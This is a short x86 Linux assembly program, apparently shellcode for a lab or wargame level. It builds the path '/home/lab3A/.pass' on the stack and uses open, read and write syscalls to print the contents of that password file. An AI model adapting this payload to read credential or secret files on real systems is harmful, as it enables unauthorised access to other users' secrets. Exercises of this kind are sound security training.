    segment .text
    global _start

_start:
    push 0x73
    push 0x7361702e
    push 0x2f413362
    push 0x616c2f65
    push 0x6d6f682f
    mov ebx,esp     ;
    mov eax,0x5     ; 5=open
    xor ecx, ecx
    xor edx,edx
    int 0x80        ; return fd=eax

    sub esp,100
    mov ebx,eax     ;fd
    mov eax,0x3     ;3=read
    mov ecx,esp     ;buf
    mov edx,100     ;size
    int 0x80        

    mov eax,0x04    ; 4=write
    mov ebx,1       ; stdout
    mov ecx,esp
    mov edx,100
    int 0x80